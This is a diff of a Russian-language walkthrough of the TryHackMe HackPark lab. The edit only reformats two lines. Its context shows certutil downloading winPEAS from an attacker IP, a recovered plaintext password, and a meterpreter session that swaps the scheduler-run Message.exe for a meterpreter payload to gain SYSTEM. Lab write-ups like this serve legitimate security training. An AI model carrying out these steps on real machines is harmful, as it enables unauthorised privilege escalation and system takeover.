@@ -253,7 +253,7 @@ certutil -urlcache -f http://10.21.104.16:8888/winPEASx64.exe winPEASany.exe
     DefaultPassword               :  4q6XvFES7Fdxs
 ```
 
-Перехожу в 
+Перехожу в **"c:\Program Files (x86)\SystemScheduler"**
 ```
 meterpreter > ls
 Listing: c:\Program Files (x86)\SystemScheduler
@@ -333,7 +333,7 @@ meterpreter > cat 20198415519.INI_LOG.txt
 08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
 ```
 
-Загружаю **meter-5555.exe** в **c:\Program Files (x86)\SystemScheduler\** вместо **Message.exe** и получаю SYSTEM
+Загружаю **meter-5555.exe** в **"c:\Program Files (x86)\SystemScheduler\"** вместо **Message.exe** и получаю SYSTEM
 ```
 meterpreter > upload /home/kali/Labs/TryHackMe/Win\ Medium\ -\ HackPark/exploits/meter-5555.exe
 meterpreter > mv Message.exe Message.bak
